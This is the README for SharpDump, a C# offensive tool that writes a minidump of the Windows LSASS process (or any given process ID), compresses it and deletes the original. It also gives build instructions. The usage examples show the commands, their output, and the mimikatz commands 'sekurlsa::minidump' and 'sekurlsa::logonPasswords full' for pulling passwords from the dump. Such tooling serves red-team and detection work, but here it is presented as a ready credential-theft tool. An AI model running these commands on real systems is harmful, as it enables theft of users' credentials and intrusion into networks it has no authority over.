# SharpDump

----

SharpDump is a C# port of [PowerSploit's Out-Minidump.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) functionality. The [MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API call is used to create a minidump for the process ID specified (LSASS by default) to C:\Windows\Temp\debug<PID>.out, GZipStream is used to compress the dump to C:\Windows\Temp\debug<PD>.bin (.gz format), and the original minidump file is deleted.

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SharpDump is licensed under the BSD 3-Clause license.

## Usage

Dump LSASS:

    C:\Temp>SharpDump.exe

    [*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out
    [+] Dump successful!

    [*] Compressing C:\WINDOWS\Temp\debug808.out to C:\WINDOWS\Temp\debug808.bin gzip file
    [*] Deleting C:\WINDOWS\Temp\debug808.out

    [+] Dumping completed. Rename file to "debug808.gz" to decompress.

    [*] Operating System : Windows 10 Enterprise N
    [*] Architecture     : AMD64
    [*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch


Dump a specific process ID:

    C:\Temp>SharpDump.exe 8700

    [*] Dumping notepad++ (8700) to C:\WINDOWS\Temp\debug8700.out
    [+] Dump successful!

    [*] Compressing C:\WINDOWS\Temp\debug8700.out to C:\WINDOWS\Temp\debug8700.bin gzip file
    [*] Deleting C:\WINDOWS\Temp\debug8700.out

    [+] Dumping completed. Rename file to "debug8700.gz" to decompress.

## Compile Instructions

We are not planning on releasing binaries for SharpDump, so you will have to compile yourself :)

SharpDump has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
